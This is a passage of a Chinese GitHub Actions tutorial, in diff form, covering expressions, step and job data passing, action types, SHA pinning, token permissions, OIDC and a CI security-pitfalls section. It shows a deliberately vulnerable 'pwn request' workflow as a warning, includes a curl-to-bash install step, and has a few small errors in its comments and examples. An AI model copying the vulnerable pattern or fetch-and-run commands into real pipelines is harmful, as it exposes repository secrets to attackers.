+</tbody>
+</table></div>
+<p><strong>常用函数：</strong></p>
+<pre><code class="language-yaml">${{ contains(github.event.head_commit.message, '[skip ci]') }}
+${{ startsWith(github.ref, 'refs/tags/v') }}
+${{ endsWith(github.ref, '/main') }}
+${{ format('{0}-{1}', matrix.os, matrix.node) }}
+${{ join(matrix.node, ', ') }}
+${{ toJSON(github.event) }}
+${{ fromJSON(needs.build.outputs.matrix) }}
+${{ hashFiles('**/package-lock.json') }}
+</code></pre>
+<p>几个细节：</p>
+<ul>
+<li><code>contains()</code> <strong>大小写不敏感</strong>，且能用于数组和子串。</li>
+<li>表达式里的字符串<strong>只能用单引号</strong>，双引号会报错；字符串内的单引号用两个连写转义：<code>'It''s ok'</code>。</li>
+<li>比较运算符的类型转换很松散：<code>null</code> → 0，<code>true</code> → 1，空字符串 → 0，数组/对象 → NaN（任何与 NaN 的比较都是 false）。<strong>不要依赖隐式类型转换做数值比较。</strong></li>
+<li>访问不存在的属性返回<strong>空字符串</strong>，不报错——这既是便利也是 bug 来源。</li>
+<li>判断多事件的标准写法：<code>contains(fromJSON('[&quot;push&quot;,&quot;pull_request&quot;]'), github.event_name)</code></li>
+<li>新增的 <code>case()</code> 函数：<code>case(条件1, 值1, 条件2, 值2, 默认值)</code>，第一个匹配的条件生效。</li>
+</ul>
+<p><strong>状态函数与 <code>if</code> 的坑：</strong></p>
+<pre><code class="language-yaml">steps:
+  - run: echo &quot;总是执行&quot;
+    if: ${{ always() }}
+
+  - run: echo &quot;只在前面失败时执行&quot;
+    if: ${{ failure() }}
+
+  - run: echo &quot;只在前面的 step 成功时执行&quot;
+    if: ${{ success() }}
+
+  - run: echo &quot;任务被取消时执行&quot;
+    if: ${{ cancelled() }}
+
+  - run: echo &quot;tag 推送时执行&quot;
+    if: ${{ !startsWith(github.ref, 'refs/tags/') }}   # ← ! 必须包在 ${{ }} 里
+</code></pre>
+
+<div class="callout warning"><p class="callout-title"><code>if</code> 的四个坑</p>
+<ol>
+<li><strong>条件以 <code>!</code> 开头时必须写 <code>${{ }}</code></strong>。YAML 里 <code>!</code> 是标签语法，裸写 <code>if: !startsWith(...)</code> 会解析失败。写成 <code>if: ${{ !startsWith(...) }}</code> 或加括号 <code>if: (!startsWith(...))</code>。</li>
+<li><strong>secrets 不能直接在 <code>if</code> 里比较</strong>。正确做法是先赋给 job 级 <code>env</code>，再判断 <code>env.TOKEN != ''</code>。</li>
+<li><strong>不写状态函数时，隐含一个 <code>success()</code></strong>。所以 <code>if: github.ref == 'refs/heads/main'</code> 在前序失败时不会执行——想让它执行得显式加上 <code>&amp;&amp; !failure()</code>。</li>
+<li><strong><code>always()</code> 慎用</strong>。官方文档现在明确警告：用在关键失败处理上可能让 workflow 挂到超时。推荐用 <code>if: ${{ !cancelled() }}</code> 代替。</li>
+</ol>
+</div>
+<p><code>needs.&lt;job&gt;.result</code> 的四个取值，用来做 job 级分支：</p>
+<pre><code class="language-yaml">jobs:
+  deploy:
+    needs: [build, test]
+    if: ${{ needs.build.result == 'success' &amp;&amp; needs.test.result == 'success' }}
+</code></pre>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>值</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>success</code></td>
+<td>成功</td>
+</tr>
+<tr>
+<td><code>failure</code></td>
+<td>失败</td>
+</tr>
+<tr>
+<td><code>cancelled</code></td>
+<td>被取消</td>
+</tr>
+<tr>
+<td><code>skipped</code></td>
+<td>因 <code>if</code> 条件不满足而跳过</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="ch-6-6">6.6 Step 之间怎么传数据：四个 <code>GITHUB_*</code> 文件</h3>
+<p>这是新手最容易出错、老教程最容易过时的地方。</p>
+<p><strong>核心事实：每个 <code>run</code> 是一个独立的 shell 进程，互相之间不继承任何环境。</strong></p>
+<p>那怎么传？GitHub 给每个 step 准备了一组<strong>临时文件</strong>，你把内容写进去，runner 会在 step 结束后读取并生效。路径存在同名的环境变量里：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>文件（环境变量）</th>
+<th>作用</th>
+<th>生效范围</th>
+<th>读取方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>$GITHUB_OUTPUT</code></td>
+<td>定义 step 的输出</td>
+<td>通过 <code>steps.&lt;id&gt;.outputs.&lt;name&gt;</code></td>
+<td>后续 step 显式引用</td>
+</tr>
+<tr>
+<td><code>$GITHUB_ENV</code></td>
+<td>设置环境变量</td>
+<td>后续<strong>所有</strong> step</td>
+<td><code>$VAR</code> / <code>${{ env.VAR }}</code></td>
+</tr>
+<tr>
+<td><code>$GITHUB_PATH</code></td>
+<td>追加 PATH</td>
+<td>后续所有 step</td>
+<td>直接调用命令</td>
+</tr>
+<tr>
+<td><code>$GITHUB_STEP_SUMMARY</code></td>
+<td>Markdown 摘要</td>
+<td>无（展示用）</td>
+<td>运行页面上可见</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>用法示例：</strong></p>
+<pre><code class="language-yaml">steps:
+  - name: 生成版本号
+    id: meta
+    run: |
+      VERSION=&quot;v$(date +%Y.%m.%d)-${GITHUB_SHA::7}&quot;
+      echo &quot;version=$VERSION&quot; &gt;&gt; &quot;$GITHUB_OUTPUT&quot;     # ← step 输出
+      echo &quot;BUILD_TIME=$(date -u +%FT%TZ)&quot; &gt;&gt; &quot;$GITHUB_ENV&quot;   # ← 环境变量
+
+  - name: 使用
+    run: |
+      echo &quot;版本：${{ steps.meta.outputs.version }}&quot;
+      echo &quot;构建时间：$BUILD_TIME&quot;                     # ← 直接当环境变量用
+
+  - name: 把自定义工具加进 PATH
+    run: echo &quot;$HOME/.local/bin&quot; &gt;&gt; &quot;$GITHUB_PATH&quot;
+
+  - name: 写一个漂亮的运行摘要
+    run: |
+      {
+        echo &quot;## 构建结果&quot;
+        echo &quot;&quot;
+        echo &quot;| 项目 | 值 |&quot;
+        echo &quot;|------|-----|&quot;
+        echo &quot;| 版本 | ${{ steps.meta.outputs.version }} |&quot;
+        echo &quot;| 提交 | \`${GITHUB_SHA::7}\` |&quot;
+      } &gt;&gt; &quot;$GITHUB_STEP_SUMMARY&quot;
+</code></pre>
+<p><strong>注意事项：</strong></p>
+<ul>
+<li>文件必须是 <strong>UTF-8</strong>，多条命令用换行分隔。</li>
+<li><code>$GITHUB_ENV</code> <strong>不能设置 <code>NODE_OPTIONS</code></strong>（这是刻意的安全限制，防止注入加载任意模块）。</li>
+<li><code>$GITHUB_STEP_SUMMARY</code> 每个 step 上限 <strong>1 MiB</strong>，一个 job 最多渲染 <strong>20 个</strong> summary。</li>
+<li>新增的 <code>$GITHUB_ARTIFACTS</code> / <code>$GITHUB_ARTIFACTS_LIST</code> 可以用来声明产物（支持文件路径和 OCI 镜像 digest），单 job 上限 500 个。</li>
+</ul>
+
+<div class="callout warning"><p class="callout-title">如果你在网上抄到 <code>::set-output</code>，那是废弃语法</p>
+<p>老教程里常见的这三种写法<strong>已经被彻底移除</strong>：</p>
+<pre><code>echo &quot;::set-output name=foo::bar&quot;     ❌ 已移除
+echo &quot;::set-env name=FOO::bar&quot;        ❌ 已移除
+echo &quot;::add-path::/some/path&quot;         ❌ 已移除
+</code></pre>
+<p>正确写法是写进 <code>$GITHUB_OUTPUT</code> / <code>$GITHUB_ENV</code> / <code>$GITHUB_PATH</code> 文件。仍然可用的 <code>::</code> 命令只剩：<code>::debug::</code>、<code>::notice::</code>、<code>::warning::</code>、<code>::error::</code>、<code>::group::</code> / <code>::endgroup::</code>、<code>::add-mask::</code>、<code>::stop-commands::</code> / <code>::resume-commands::</code>。</p>
+</div>
+<h3 id="ch-6-7">6.7 Job 之间怎么传数据</h3>
+<p>job 之间是隔离的机器，传数据只有两条路：<strong>outputs</strong>（小数据）和 <strong>artifacts</strong>（文件）。</p>
+<pre><code class="language-yaml">jobs:
+  setup:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix: ${{ steps.set-matrix.outputs.matrix }}     # 把 step 输出提升为 job 输出
+      version: ${{ steps.meta.outputs.version }}
+    steps:
+      - id: meta
+        run: echo &quot;version=v1.2.3&quot; &gt;&gt; &quot;$GITHUB_OUTPUT&quot;
+      - id: set-matrix
+        run: |
+          echo 'matrix={&quot;include&quot;:[{&quot;project&quot;:&quot;web&quot;,&quot;config&quot;:&quot;Release&quot;},{&quot;project&quot;:&quot;api&quot;,&quot;config&quot;:&quot;Debug&quot;}]}' &gt;&gt; &quot;$GITHUB_OUTPUT&quot;
+
+  build:
+    needs: setup
+    runs-on: ubuntu-latest
+    strategy:
+      matrix: ${{ fromJSON(needs.setup.outputs.matrix) }}   # ← 动态矩阵
+    steps:
+      - run: echo &quot;构建 ${{ matrix.project }} (${{ matrix.config }})，版本 ${{ needs.setup.outputs.version }}&quot;
+</code></pre>
+<p><strong>关键细节：<code>steps.&lt;id&gt;.outputs.&lt;name&gt;</code> 的值</strong>永远是字符串**。** 想传数字或布尔值，必须用 <code>fromJSON()</code> 转换——上面的动态矩阵就是这个套路的典型用法。</p>
+<h3 id="ch-6-8">6.8 新语法：后台步骤与并行步骤</h3>
+<p>近期加入的能力，用于在一个 job 内并发执行：</p>
+<pre><code class="language-yaml">steps:
+  - id: dev-server            # 必须有 id，才能被下面的 wait 引用
+    name: 启动开发服务器
+    run: npm run dev
+    background: true          # 后台运行，不阻塞后续步骤
+
+  - name: 等服务就绪后跑 E2E
+    wait:                     # 本步骤执行前，先等这些后台步骤就绪
+      - dev-server
+    run: npx playwright test
+</code></pre>
+<ul>
+<li><code>background: true</code> 可以加在 <code>run</code> 或 <code>uses</code> 步骤上，<strong>每个 job 最多 10 个并发后台步骤</strong>，超出的排队。</li>
+<li>后台步骤的输出和环境变量<strong>只有在 <code>wait</code> / <code>wait-all</code> 之后才可见</strong>。</li>
+<li>后台步骤失败时，job 会在下一个覆盖它的 <code>wait</code> / <code>wait-all</code> 处失败。</li>
+<li>job 结束前有一个隐式的 <code>wait-all</code>。</li>
+<li><code>wait</code> <strong>不支持 <code>if</code></strong>，也不能用在 composite action 内部。</li>
+</ul>
+
+      </section>
+
+      <section class="chapter" id="ch-7">
+        <div class="chapter-head"><span class="chapter-no">07</span><h2>七、Action：可复用的构建块</h2></div>
+<p><code>uses:</code> 引用的东西就是 action。理解它的三种形态，你就能判断&quot;该抄哪个&quot;以及&quot;该不该自己写&quot;。</p>
+<h3 id="ch-7-1">7.1 三种类型</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>定义文件</th>
+<th>运行方式</th>
+<th>启动速度</th>
+<th>平台支持</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>JavaScript action</strong></td>
+<td><code>action.yml</code> + <code>runs.using: node24</code></td>
+<td>runner 上的 Node 直接执行</td>
+<td>快（毫秒级）</td>
+<td>全平台</td>
+<td>调 API、处理文件、轻量逻辑</td>
+</tr>
+<tr>
+<td><strong>Docker container action</strong></td>
+<td><code>action.yml</code> + <code>runs.using: docker</code></td>
+<td>拉镜像 → 起容器 → 执行</td>
+<td>慢（拉镜像）</td>
+<td><strong>仅 Linux</strong></td>
+<td>需要特定工具链/系统依赖</td>
+</tr>
+<tr>
+<td><strong>Composite action</strong></td>
+<td><code>action.yml</code> + <code>runs.using: composite</code></td>
+<td>把一串 step 组合起来</td>
+<td>无额外开销</td>
+<td>全平台</td>
+<td>把重复的步骤序列封装成一步</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>JavaScript action 的结构：</strong></p>
+<pre><code class="language-yaml"># action.yml
+name: 'My Action'
+runs:
+  using: 'node24'      # 或 node20
+  main: 'dist/index.js'
+  pre: 'dist/setup.js'         # 可选：job 开始前执行
+  pre-if: 'always()'
+  post: 'dist/cleanup.js'      # 可选：job 结束后执行（即使失败也跑）
+  post-if: 'always()'
+</code></pre>
+<p>JS action 通常要用 <code>@vercel/ncc</code> 把依赖打包进 <code>dist/</code>——因为 runner 不会给你 <code>npm install</code>。</p>
+<p><strong>Docker action 的结构：</strong></p>
+<pre><code class="language-yaml">runs:
+  using: 'docker'
+  image: 'Dockerfile'          # 或 docker://alpine:3.20
+  args:
+    - ${{ inputs.who-to-greet }}
+  env:
+    FOO: bar
+  entrypoint: /entrypoint.sh
+</code></pre>
+<p>注意 <code>with.args</code> 和 <code>with.entrypoint</code> 在 workflow 里可以被覆盖。</p>
+<p><strong>Composite action 的结构（最实用的自建形态）：</strong></p>
+<pre><code class="language-yaml"># .github/actions/deploy/action.yml
+name: '部署到服务器'
+description: '把构建产物同步到目标机器并重启服务'
+
+inputs:
+  host:
+    description: '目标主机'
+    required: true
+  user:
+    description: 'SSH 用户'
+    required: false
+    default: 'deploy'
+  source:
+    description: '要同步的目录'
+    required: true
+    default: './dist'
+
+outputs:
+  deployed-sha:
+    description: '部署的 commit SHA'
+    value: ${{ steps.deploy.outputs.sha }}    # composite 的 output 必须有 value
+
+runs:
+  using: 'composite'
+  steps:
+    - name: 准备 SSH 密钥
+      shell: bash                            # ← composite 里每个 step 必须显式写 shell
+      run: |
+        mkdir -p ~/.ssh
+        echo &quot;${{ inputs.ssh-key }}&quot; &gt; ~/.ssh/id_ed25519
+        chmod 600 ~/.ssh/id_ed25519
+        ssh-keyscan -H ${{ inputs.host }} &gt;&gt; ~/.ssh/known_hosts 2&gt;/dev/null
+
+    - name: 同步文件
+      shell: bash
+      run: |
+        rsync -az --delete \
+          -e &quot;ssh -i ~/.ssh/id_ed25519 -o StrictHostKeyChecking=yes&quot; \
+          &quot;${{ inputs.source }}/&quot; \
+          &quot;${{ inputs.user }}@${{ inputs.host }}:/srv/app/&quot;
+
+    - id: deploy
+      name: 重启服务
+      shell: bash
+      run: |
+        ssh -i ~/.ssh/id_ed25519 &quot;${{ inputs.user }}@${{ inputs.host }}&quot; \
+          &quot;sudo systemctl restart app&quot;
+        echo &quot;sha=${GITHUB_SHA}&quot; &gt;&gt; &quot;$GITHUB_OUTPUT&quot;
+</code></pre>
+<p>使用时：</p>
+<pre><code class="language-yaml">steps:
+  - uses: actions/checkout@v7
+  - uses: ./.github/actions/deploy            # ← 本地 action 用相对路径
+    with:
+      host: ${{ vars.DEPLOY_HOST }}
+      source: ./dist
+</code></pre>
+<h3 id="ch-7-2">7.2 <code>uses:</code> 的三种来源</h3>
+<pre><code class="language-yaml">- uses: actions/checkout@v7                      # ① 官方 action（github/actions 组织下）
+- uses: docker/build-push-action@v7              # ② 第三方公开 action（owner/repo@ref）
+- uses: ./.github/actions/my-composite           # ③ 仓库内的本地 action
+</code></pre>
+<p>① 和 ② 是&quot;下载别人的代码并在你的 job 里执行&quot;。这就引出了下一个问题。</p>
+<h3 id="ch-7-3">7.3 版本固定的安全问题</h3>
+<p><code>@v7</code> 这样的<strong>浮动 tag 是可以被移动的</strong>。action 的作者（或任何拿到该仓库写权限的人/攻击者）可以把 <code>v7</code> 这个 tag 指向完全不同的代码。你的 workflow 什么都没改，但下次运行执行的已经是另一份代码——而它带着你的 <code>GITHUB_TOKEN</code> 和所有 secrets。</p>
+<pre><code>@v7                    → 移动 tag，方便，但内容可变
+@v7.0.1                → 精确 tag，仍然可以被删除后重建
+@3d3c42e5aac5...（40 位 SHA） → 内容不可变（Git 对象寻址天然防篡改）
+</code></pre>
+<p>真实世界里这类攻击发生过：<code>tj-actions/changed-files</code> 被入侵后，攻击者修改了已有的 tag 指向恶意提交，导致大量下游仓库的 secrets 被打印到公开日志里。</p>
+
+<div class="callout"><p class="callout-title">安全实践</p>
+<p><strong>第三方 action 一律用完整 40 位 commit SHA 固定。</strong> 官方文档的原话是：SHA 固定&quot;是目前唯一把 action 当作不可变发布来使用的方式&quot;。</p>
+<p>代价是升级很麻烦——用 Dependabot 解决。在 <code>.github/dependabot.yml</code> 里配置：</p>
+<pre><code class="language-yaml">version: 2
+updates:
+  - package-ecosystem: &quot;github-actions&quot;
+    directory: &quot;/&quot;
+    schedule:
+      interval: &quot;weekly&quot;
+</code></pre>
+<p>Dependabot 会发现新版本并提 PR——<strong>注意它会把 SHA 更新成新版本的 SHA 并保留注释里的版本号</strong>，既有安全性又不用手动维护。</p>
+</div>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>建议</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>官方 <code>actions/*</code></td>
+<td><code>@vN</code> 可以接受（GitHub 自己维护，风险低）</td>
+</tr>
+<tr>
+<td>高星第三方（<code>docker/*</code>、<code>softprops/*</code> 等）</td>
+<td>至少 <code>@vN</code>，重要项目建议 pin SHA</td>
+</tr>
+<tr>
+<td>冷门第三方 / 个人仓库</td>
+<td><strong>必须 pin SHA</strong></td>
+</tr>
+<tr>
+<td>内部自建 action</td>
+<td>直接放仓库里用相对路径，无外部依赖</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="ch-7-4">7.4 静态检查工具</h3>
+<p>两个当前活跃的工具值得加进流水线：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>语言</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>actionlint</strong></td>
+<td>Go，v1.7.12</td>
+<td>语法校验、shellcheck 集成、表达式类型检查</td>
+</tr>
+<tr>
+<td><strong>zizmor</strong></td>
+<td>Rust</td>
+<td>安全审计：模板注入、凭证残留、权限过大、未 pin 的 action、危险触发器等，支持 SARIF 输出</td>
+</tr>
+</tbody>
+</table></div>
+<pre><code class="language-yaml">- name: 检查 workflow 语法
+  run: |
+    bash &lt;(curl -sSf https://raw.githubusercontent.com/rhysd/actionlint/main/scripts/download-actionlint.bash)
+    ./actionlint -color
+</code></pre>
+
+      </section>
+
+      <section class="chapter" id="ch-8">
+        <div class="chapter-head"><span class="chapter-no">08</span><h2>八、身份、密钥与权限</h2></div>
+<p>前四章回答了&quot;什么时候跑/在哪跑/跑什么/产物去哪&quot;。这一章回答第五个问题：<strong>流水线用什么身份去访问外部系统。</strong></p>
+<h3 id="ch-8-1">8.1 <code>GITHUB_TOKEN</code> 到底是什么</h3>
+<p>大多数人把它当成一个普通的环境变量，但它其实是一个<strong>完整生命周期管理的凭证</strong>：</p>
+<pre><code>每个 job 开始前
+      │
+      ▼
+GitHub 为该仓库上的 &quot;GitHub Actions&quot; App 签发一个
+      Installation Access Token
+      │
+      ├─ 作用域：仅限当前仓库（拿到别的仓库没用）
+      ├─ 权限：由 permissions: 决定（见 8.2）
+      ├─ 生命周期：job 结束即失效
+      │   （托管 runner 最长 6 小时；自建 runner 最长 24 小时）
+      └─ 注入方式：环境变量 + github.token 上下文
+      │
+      ▼
+job 结束 → token 立即失效，即使被打印到日志也没用了
+</code></pre>
+<p><strong>这解释了为什么 <code>GITHUB_TOKEN</code> 比 PAT 安全得多</strong>：它是一个短命的、作用域受限的令牌，而不是一个长期有效的万能钥匙。</p>
+<p><strong>一个反直觉的行为</strong>：用 <code>GITHUB_TOKEN</code> 提交代码<strong>不会触发新的 workflow 运行</strong>（这是防止无限递归的保护）。例外有两个：<code>workflow_dispatch</code> 和 <code>repository_dispatch</code> 永远会触发；用 <code>GITHUB_TOKEN</code> 创建/更新的 <code>pull_request</code> 会创建运行，但处于<strong>需要审批</strong>的状态。</p>
+<h3 id="ch-8-2">8.2 <code>permissions:</code>：最小权限</h3>
+<pre><code class="language-yaml"># 以下四种写法任选其一（同一个 permissions 块里只能选一种形式）
+
+permissions: {}                       # 什么权限都不给（最严格）
+permissions: read-all                 # 全部只读
+permissions: write-all                # 全部可写（强烈不推荐）
+permissions:
+  contents: read                      # 只读代码
+  pull-requests: write                # 可以评论 PR
+  id-token: write                     # 换取 OIDC token（见 8.4）
+</code></pre>
+<p>可用的 scope：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>Scope</th>
+<th>可取值</th>
+<th>典型用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>contents</code></td>
+<td>read/write</td>
+<td>读代码、创建 release、推 tag</td>
+</tr>
+<tr>
+<td><code>pull-requests</code></td>
+<td>read/write</td>
+<td>评论/打标签 PR</td>
+</tr>
+<tr>
+<td><code>issues</code></td>
+<td>read/write</td>
+<td>管理 issue</td>
+</tr>
+<tr>
+<td><code>packages</code></td>
+<td>read/write</td>
+<td>推镜像到 GHCR</td>
+</tr>
+<tr>
+<td><code>deployments</code></td>
+<td>read/write</td>
+<td>创建部署记录</td>
+</tr>
+<tr>
+<td><code>pages</code></td>
+<td>read/write</td>
+<td>发布 GitHub Pages</td>
+</tr>
+<tr>
+<td><code>checks</code></td>
+<td>read/write</td>
+<td>管理检查结果</td>
+</tr>
+<tr>
+<td><code>statuses</code></td>
+<td>read/write</td>
+<td>提交 commit status</td>
+</tr>
+<tr>
+<td><code>id-token</code></td>
+<td><strong>write/none</strong></td>
+<td>OIDC（没有 read 这个值）</td>
+</tr>
+<tr>
+<td><code>attestations</code></td>
+<td>read/write</td>
+<td>产物证明</td>
+</tr>
+<tr>
+<td><code>security-events</code></td>
+<td>read/write</td>
+<td>上传 code scanning 结果</td>
+</tr>
+<tr>
+<td><code>actions</code></td>
+<td>read/write</td>
+<td>管理 workflow run</td>
+</tr>
+<tr>
+<td><code>discussions</code></td>
+<td>read/write</td>
+<td>管理 discussion</td>
+</tr>
+<tr>
+<td><code>vulnerability-alerts</code></td>
+<td><strong>read/none</strong></td>
+<td>读漏洞告警</td>
+</tr>
+</tbody>
+</table></div>
+
+<div class="callout warning"><p class="callout-title">最容易被忽略的一条规则</p>
+<p><strong>只要显式列出了任何一个 scope，没列出的 scope 全部变成 <code>none</code>。</strong></p>
+<pre><code class="language-yaml">permissions:
+  contents: read       # ← 这一行意味着 pull-requests、issues 等全部变成 none
+</code></pre>
+<p>这就是很多人写完 <code>permissions</code> 之后&quot;PR 评论突然失败了&quot;的原因。反过来，正确地用它能让 token 的权限收缩到刚好够用——<strong>这是性价比最高的一条安全加固。</strong></p>
+</div>
+<p>权限的解析顺序（后者覆盖前者）：</p>
+<pre><code>企业/组织/仓库默认 → workflow 级 permissions: → job 级 permissions:
+                                                      │
+                                    fork PR 特殊处理：任何 write 被降级为 read
+                                    （除非仓库开启了 &quot;Send write tokens to workflows from pull requests&quot;）
+</code></pre>
+<h3 id="ch-8-3">8.3 Secrets、Variables 与 Environments</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>机制</th>
+<th>用途</th>
+<th>是否加密</th>
+<th>日志中</th>
+<th>作用域</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Secrets</strong></td>
+<td>密钥、密码、token</td>
+<td>✅ 加密存储</td>
+<td>自动打码 <code>***</code></td>
+<td>仓库 / 组织 / 环境</td>
+</tr>
+<tr>
+<td><strong>Variables</strong></td>
+<td>非敏感配置（域名、区域）</td>
+<td>❌ 明文</td>
+<td>原样显示</td>
+<td>仓库 / 组织 / 环境</td>
+</tr>
+<tr>
+<td><strong>Environments</strong></td>
+<td>部署目标（含审批与保护规则）</td>
+<td>—</td>
+<td>—</td>
+<td>引用它的 job</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>Environments 是&quot;部署审批&quot;的实现方式：</strong></p>
+<pre><code class="language-yaml">jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment:
+      name: production
+      url: https://codis.fun/yj-knowledge-bank
+    steps:
+      - run: ./deploy.sh
+</code></pre>
+<p>在仓库 Settings → Environments 里给 <code>production</code> 配置：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>保护规则</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Required reviewers</strong></td>
+<td>最多 6 个用户/团队，<strong>任意一人批准即可</strong>；可勾选&quot;禁止自我批准&quot;</td>
+</tr>
+<tr>
+<td><strong>Wait timer</strong></td>
+<td>1 ~ 43200 分钟（最多 30 天），等待期间<strong>不计费</strong></td>
+</tr>
+<tr>
+<td><strong>Deployment branches</strong></td>
+<td>限制哪些分支/tag 能部署（通配符不跨 <code>/</code>）</td>
+</tr>
+</tbody>
+</table></div>
+
+<div class="callout"><p class="callout-title">Environments 的免费额度限制</p>
+<p>在 Free / Pro / Team 套餐下，<strong>环境审批只对公开仓库可用</strong>。私有仓库要享受这个能力需要 Enterprise。另外，默认情况下管理员可以绕过保护规则（可配置关闭）。</p>
+</div>
+<p><strong>Secrets 的打码机制</strong>：GitHub 会扫描日志，把与 secrets 值匹配的内容替换成 <code>***</code>。但这是<strong>字符串匹配</strong>，所以：</p>
+<ul>
+<li>如果 secret 被 base64 编码、被拆分成多行、或作为子串嵌入，就打不掉了</li>
+<li>手动打码用 <code>echo &quot;::add-mask::$VALUE&quot;</code></li>
+<li>生成的值需要跨 job 传递时，官方文档给出了一套&quot;先 mask 再写入 output&quot;的模式</li>
+</ul>
+<h3 id="ch-8-4">8.4 OIDC：不用长期密钥上云</h3>
+<p><strong>问题</strong>：部署到 AWS / GCP / Azure 时，传统做法是把云厂商的长期 Access Key 存进 GitHub Secrets。这个密钥长期有效、权限往往过大、轮转麻烦，一旦泄漏后果严重。</p>
+<p><strong>解法</strong>：OIDC（OpenID Connect）让每次运行<strong>临时换取</strong>一个短期凭证。</p>
+<pre><code>GitHub Actions                        云厂商 (AWS/GCP/Azure)
+      │                                        │
+      │ ① job 声明 id-token: write              │
+      │                                        │
+      │ ② runner 向 GitHub 的 OIDC provider      │
+      │    请求一个 JWT                          │
+      │    签发者: token.actions.githubusercontent.com
+      │    载荷 sub: repo:OWNER/REPO:ref:refs/heads/main
+      │                                        │
+      │ ③ 把这个 JWT 交给云厂商的 STS ───────────►│
+      │                                        │ ④ 校验签名（GitHub 的公钥）
+      │                                        │    校验 sub claim 是否符合
+      │                                        │    你预先配置的信任策略
+      │ ◄──── ⑤ 返回临时凭证（有效期通常 1 小时）─│
+      │                                        │
+      │ ⑥ 用临时凭证部署，过期自动失效            │
+</code></pre>
+<pre><code class="language-yaml">jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write      # 必须：换取 JWT
+      contents: read
+    steps:
+      - uses: actions/checkout@v7
+      - uses: aws-actions/configure-aws-credentials@v6
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
+          aws-region: ap-northeast-1
+      - run: aws s3 sync ./dist s3://my-bucket/
+</code></pre>
+<p>云端信任策略里最关键的是 <code>sub</code> claim 的格式：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th><code>sub</code> 格式</th>
+<th>适用场景</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>repo:OWNER/REPO:ref:refs/heads/main</code></td>
+<td>只允许 main 分支部署（最常用）</td>
+</tr>
+<tr>
+<td><code>repo:OWNER/REPO:environment:production</code></td>
+<td>只允许 production 环境部署</td>
+</tr>
+<tr>
+<td><code>repo:OWNER/REPO:pull_request</code></td>
+<td>PR 场景（<strong>危险，不要给部署权限</strong>）</td>
+</tr>
+<tr>
+<td><code>repo:OWNER/REPO:ref:refs/tags/v*</code></td>
+<td>只允许 tag 发布</td>
+</tr>
+</tbody>
+</table></div>
+
+<div class="callout warning"><p class="callout-title">2026 年的一个破坏性变更</p>
+<p><strong>2026-07-15 之后创建（或重命名/转移）的仓库，OIDC 的 <code>sub</code> claim 会带上不可变的数字 ID</strong>：</p>
+<pre><code>repo:OWNER@&lt;OWNER_ID&gt;/REPO@&lt;REPO_ID&gt;:ref:refs/heads/main
+</code></pre>
+<p>老仓库可以按组织/仓库选择性启用。</p>
+<p><strong>如果你的云厂商信任策略是按旧格式写的，这些仓库的部署会全部失败。</strong> 迁移期建议在信任策略里同时匹配两种格式（或用 <code>StringLike</code> 通配）。这是当前最容易踩的 OIDC 坑。</p>
+</div>
+<p><strong>不用密钥的包发布（Trusted Publishing）</strong>：同样的机制也被用在了包管理器的发布流程上。</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>平台</th>
+<th>是否支持</th>
+<th>要点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>PyPI</strong></td>
+<td>✅ 官方文档完善</td>
+<td>在 PyPI 注册仓库 + workflow 文件名（可选环境），job 给 <code>id-token: write</code>，用 <code>pypa/gh-action-pypi-publish</code> 且<strong>不传</strong> username/password</td>
+</tr>
+<tr>
+<td><strong>npm</strong></td>
+<td>✅ 存在（2025 年中起）</td>
+<td>要求 <strong>npm CLI ≥ 11.5.1</strong>、<strong>仅 GitHub 托管 runner</strong>（不支持自建）、环境名<strong>大小写敏感</strong>匹配；具体细节以 npm 官方文档为准</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="ch-8-5">8.5 安全陷阱清单</h3>
+<p>这一节是全文最该反复看的部分。</p>
+<h4>陷阱一：<code>pull_request_target</code> + checkout PR 代码 = 泄密</h4>
+<p>这是 GitHub Actions 上最经典的漏洞模式（业内叫 &quot;pwn request&quot;）。</p>
+<pre><code class="language-yaml"># ❌ 危险写法
+on: pull_request_target            # workflow 文件取自受信任的默认分支
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}   # ← 检出了攻击者的代码
+      - run: npm install                                     # ← 执行了攻击者的代码
+</code></pre>
+<p><strong>为什么危险</strong>：<code>pull_request_target</code> 的设计目的是&quot;对 PR 做元数据操作&quot;（打标签、发评论），因此它能拿到 secrets 和可写 token。而上面这段代码又 checkout 了 fork 的代码并执行——攻击者只要在 PR 里改一下 <code>package.json</code> 的 <code>postinstall</code> 脚本，你的 secrets 就是他的了。</p>
+<pre><code>受信任的 workflow 文件  +  不可信的代码  +  高权限凭证  =  漏洞
+        ↑                      ↑                  ↑
